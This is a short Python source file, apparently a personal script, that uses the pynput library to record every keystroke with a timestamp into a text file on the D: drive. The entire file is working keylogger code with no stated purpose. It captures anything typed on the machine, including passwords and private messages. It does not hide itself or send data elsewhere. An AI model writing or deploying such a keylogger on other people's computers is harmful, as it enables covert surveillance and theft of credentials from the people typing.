# -*- coding: utf-8 -*-
"""
Created on Thu Oct  3 13:30:46 2019

@author: inkuml05
"""

from pynput.keyboard import Listener
import logging

log_dir =r'D:/'
logging.basicConfig(filename = (log_dir + "keyLogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press = on_press) as listner:
    listner.join()
    
